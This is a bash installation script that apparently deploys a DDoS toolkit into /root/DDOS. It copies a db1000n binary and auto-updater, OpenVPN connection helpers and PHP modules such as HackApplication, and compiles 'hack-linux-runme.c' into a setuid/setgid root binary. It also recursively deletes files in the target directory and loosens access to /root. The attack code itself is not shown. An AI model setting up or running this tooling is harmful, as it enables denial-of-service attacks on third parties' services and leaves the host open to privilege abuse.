#!/usr/bin/env bash
cd ../
pwd

cp /root/DDOS/DB1000N/db1000n            ./DB1000N
find /root/DDOS ! -path '*git*' -delete

gcc -o ./hack-linux-runme.elf     ./hack-linux-runme.c
date +%Y%m%d.%H%M > ./version.txt

#mkdir /root/DDOS
#mkdir /root/DDOS/DB1000N
mkdir /root/DDOS/open-vpn

cp ./DB1000N/db1000n                       /root/DDOS/DB1000N
cp ./DB1000N/db1000nAutoUpdater.php        /root/DDOS/DB1000N
cp ./open-vpn/on-open-vpn-up.cli.php       /root/DDOS/open-vpn
cp ./open-vpn/OpenVpnConfig.php            /root/DDOS/open-vpn
cp ./open-vpn/OpenVpnConnection.php        /root/DDOS/open-vpn
cp ./common.php                            /root/DDOS
cp ./Efficiency.php                        /root/DDOS
cp ./functions.php                         /root/DDOS
cp ./functions-mb-string.php               /root/DDOS
mv ./hack-linux-runme.elf                  /root/DDOS
cp ./HackApplication.php                   /root/DDOS
cp ./init.php                              /root/DDOS
cp ./main.cli.php                          /root/DDOS
cp ./ResourcesConsumption.php              /root/DDOS
cp ./Term.php                              /root/DDOS
cp ./version.txt                           /root/DDOS
#cp ./source-code/docker.config                        /root/DDOS

cd /root/DDOS
pwd

find "./" -type d -print0 | xargs -0 chmod u=rwx,g=rwx,o=
find "./" -type f -print0 | xargs -0 chmod u=rw,g=rw,o=
find "./" -print0 | xargs -0 chown root
find "./" -print0 | xargs -0 chgrp root
chmod o+rx  /root
chmod o+rx  /root/DDOS

chmod u=rwxs,g=rwxs,o=rx ./hack-linux-runme.elf
chmod u+x,g+x ./DB1000N/db1000n
chmod u+x,g+x ./DB1000N/git-for-auto-update/db1000n/install.sh
chmod u+x,g+x ./open-vpn/on-open-vpn-up.cli.php
chmod u+x,g+x ./main.cli.php

systemctl enable rsyslog &>/dev/null



